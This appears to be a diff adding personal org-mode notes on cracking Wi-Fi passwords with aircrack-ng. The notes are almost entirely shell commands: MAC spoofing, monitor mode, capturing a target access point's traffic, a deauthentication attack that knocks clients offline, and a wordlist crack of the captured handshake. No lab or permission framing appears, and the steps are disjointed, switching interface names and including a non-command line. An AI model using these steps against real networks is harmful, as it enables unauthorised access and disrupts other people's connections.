@@ -1,0 +1,132 @@
+#+STARTUP: content
+#+OPTIONS: num:nil
+#+OPTIONS: author:nil
+
+* aircrack-ng
+ 
+How to get the atheros card to work:
+ 
++ first disable the interface using:
+
+#+BEGIN_SRC sh
+airmon-ng stop ath0
+ifconfig wifi0 down
+macchanger --mac 00:11:22:33:44:55 wifi0
+#+END_SRC
+
+** enable the interface in monitor
+
+#+BEGIN_SRC sh
+airmon-ng start wifi0
+#+END_SRC
+
+*** find your network
+
+#+BEGIN_SRC sh
+airodump-ng ath0
+#+END_SRC
+
+[You should get a response like the following, and then push control-C once you see the network you want:
+
+#+BEGIN_SRC sh
+CH 11 ][ Elapsed: 1 min ][ 2007-12-26 22:37
+BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
+
+00:15:A0:01:C1:05 13 37 0 0 6 54 WEP WEP linksys]
+#+END_SRC
+
++ stop the atheros interface using:
+
+#+BEGIN_SRC sh
+ifconfig ath0 down
+#+END_SRC
+
+reconfigure the atheros interface to the channel (CH = 6) and rate (MB = 54) used by the target AP (essid = linksys, BSSID = 00:15:A0:01:C1:05) that you found in step 3:
+
+#+BEGIN_SRC sh
+iwconfig ath0 rate 54M channel 6
+#+END_SRC
+
++ start the atheros interface using the new settings:
+
+#+BEGIN_SRC sh
+ifconfig ath0 up
+#+END_SRC
+
++ record the signals from the AP (-w is the filename for saving the information, -b is the target bssid):
+
+#+BEGIN_SRC sh
+# airodump-ng -w linksys_data -b 00:15:A0:01:C1:05 -c 6 ath0
+#+END_SRC
+
+get data faster by running aireplay-ng attacks then use aircrack-ng to get the password.
+
+#+BEGIN_SRC sh
+ath0 set up
+#+END_SRC
+
+In order to get the modem into monitor mode we must first get rid of all the managed mode VAPs.
+
+#+BEGIN_SRC sh
+iwconfig
+#+END_SRC
+
+You will see your card as ath0 in manged mode. In order to stop that VAP we must use a utility call wlanconfig.
+
+#+BEGIN_SRC sh
+wlanconfig ath0 destroy
+#+END_SRC
+
+Now if run iwconfig you should not see your ath0 VAP anymore. Now we have to create a new VAP in monitor mode. Here's how:
+
+#+BEGIN_SRC sh
+wlanconfig ath0 create wlandev wifi0 wlanmode monitor
+#+END_SRC
+
+Now when you run iwconfig you should see your ath0 VAP in monitor mode.
+
+Now to make sure ath0 is 'UP' (as explained in the previous post)
+
+#+BEGIN_SRC sh
+ifconfig mon0 up
+#+END_SRC
+
+***  put card into monitor mode
+
+#+BEGIN_SRC sh
+airmon-ng stop wlan0
+#+END_SRC
+
+#+BEGIN_SRC sh
+airmon-ng start wlan0 (channel number)
+#+END_SRC
+
+for example
+ 
+#+BEGIN_SRC sh
+airmon-ng start wlan0 11
+#+END_SRC
+ 
++ for channel 11
+
+#+BEGIN_SRC sh
+airodump-ng -c 11 --bssid (bssid) -w psk ath0
+#+END_SRC
+
+for example
+
+#+BEGIN_SRC sh
+airodump-ng -c 11 --bssid 00:18:4d:3a:fe:e8 -w psk ath0
+#+END_SRC
+
+*** de authenticate 
+
+#+BEGIN_SRC sh
+aireplay-ng -0 5 -a ( access point bssid ) -c (client bssid ) ath0
+#+END_SRC
+
++  word list
+
+#+BEGIN_SRC sh
+aircrack-ng -w word.lst -b (access point)  psk*.cap
+#+END_SRC
